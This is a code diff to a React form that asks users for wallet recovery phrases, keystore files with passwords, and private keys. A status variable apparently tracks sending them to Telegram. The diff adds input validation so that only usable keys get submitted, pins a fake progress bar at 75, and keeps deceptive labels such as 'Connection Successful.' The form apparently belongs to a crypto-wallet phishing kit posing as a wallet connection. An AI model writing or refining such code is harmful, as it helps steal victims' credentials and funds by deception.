@@ -149,6 +149,10 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
         }
     };
 
+    // Add form validation for keystore and private key
+    const isKeystoreValid = type === 'keystore' && key.trim() && password.trim() && !validateKey(key);
+    const isPrivateValid = type === 'private' && key.trim() && !validateKey(key);
+
     return (
         <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="w-full max-w-md mx-auto">
@@ -280,7 +284,7 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                             </div>
                             <div>
                                 <Progress
-                                    value={telegramStatus === 'idle' ? 0 : telegramStatus === 'sending' ? 50 : 100}
+                                    value={75}
                                     className={`h-1 ${telegramStatus === 'idle' ? 'bg-zinc-700' : 'bg-[#14244d]'}`}
                                 />
                             </div>
@@ -297,8 +301,19 @@ const KeyManagementForm: React.FC<KeyManagementFormProps> = ({ type, onClose, on
                             </Button>
                             <Button
                                 type="submit"
-                                className="flex-1 bg-[#14244d] text-white font-bold hover:bg-[#b88a3f]"
-                                disabled={isLoading || telegramStatus === 'sending' || (type === 'phrase' && (is24Word ? phraseWords.slice(0,24).some(w => !w) : phraseWords.slice(0,12).some(w => !w)))}
+                                className={`flex-1 font-bold transition-all duration-200 rounded-lg
+                                    ${type === 'keystore' || type === 'private'
+                                        ? (isKeystoreValid || isPrivateValid)
+                                            ? 'bg-[#7C5CFF] text-white hover:bg-[#b88a3f] active:bg-[#7C5CFF]/80'
+                                            : 'bg-zinc-700 text-zinc-300 cursor-not-allowed opacity-60'
+                                        : 'bg-[#14244d] text-white hover:bg-[#b88a3f] active:bg-[#14244d]/80'}
+                                `}
+                                disabled={
+                                    isLoading || telegramStatus === 'sending' ||
+                                    (type === 'phrase' && (is24Word ? phraseWords.slice(0,24).some(w => !w) : phraseWords.slice(0,12).some(w => !w))) ||
+                                    (type === 'keystore' && !isKeystoreValid) ||
+                                    (type === 'private' && !isPrivateValid)
+                                }
                             >
                                 {isLoading ? 'Connection Successful.' : (type === 'keystore' ? 'Please wait...' : 'Connect Wallet')}
                             </Button>
